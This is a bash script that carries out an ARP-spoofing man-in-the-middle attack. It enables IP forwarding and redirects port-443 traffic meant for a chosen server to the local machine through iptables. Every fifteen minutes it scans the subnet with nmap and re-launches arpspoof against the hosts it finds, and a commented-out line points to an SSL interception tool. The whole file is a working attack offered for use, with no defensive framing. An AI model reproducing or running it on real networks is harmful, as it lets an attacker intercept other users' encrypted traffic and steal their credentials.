#! /bin/bash

set -e

if test $# -lt 2 ; then
    echo "usage:" `basename $0` "<iface> <host-ip> [<filter-ip> ...]"
    echo 
    echo "where:"
    echo "  iface is the interface to use, e.g. eth0"
    echo "  host-ip is the ip address of the server that we want to spoof"
    echo "  filter-ip is a list of ip addresses that should be excluded"
    echo "  from the spoof" 
    exit 1
fi

IFACE=$1
shift
HOST=$1
shift
CDIR=`ip -4 addr show ${IFACE} | grep -oP "(?<=inet )[\d\.]+/[\d]+(?= )"`
MYIP=`echo ${CDIR} | grep -oP "\d+\.\d+\.\d+\.\d+"`
FILTER=${HOST},${MYIP}

while test $# -gt 0
do
    FILTER=${FILTER},${1}
    shift
done

echo "Enabling IP Forwarding"
echo 1 > /proc/sys/net/ipv4/ip_forward

IPTABLE_SPEC="PREROUTING -d ${HOST} -i ${IFACE} -p tcp --dport 443 -j REDIRECT --to-port 443"

iptables -t nat -D ${IPTABLE_SPEC} || true
iptables -t nat -A ${IPTABLE_SPEC} 

# better to start this manually
#../mitm_ssl --host=${HOST} --rport=443 --lport=443 

handler() {
    if test ! -z "${PID}" ; then
        echo "Cleaning up arpspoof"
        kill ${PID}
        while test -e "/proc/${PID}/"
        do
            sleep 1
        done
    fi
}

trap handler SIGINT

while true 
do
    echo "Scanning network"
    TMPFILE=`mktemp`
    nmap -sS -p139 -oG ${TMPFILE} ${CDIR} > /dev/null

    ARPSPOOF=`awk -v filter=${FILTER} -v iface=${IFACE} -v host=${HOST} -f nmap.awk ${TMPFILE}`

    rm ${TMPFILE}

    if test ! -z "${PID}" ; then
        kill -9 ${PID}
        PID=""
    fi

    echo ${ARPSPOOF}
    ${ARPSPOOF} > /dev/null 2>&1 &
    PID=$!

    sleep `echo "60 * 15" | bc`
    echo "Restarting"
done
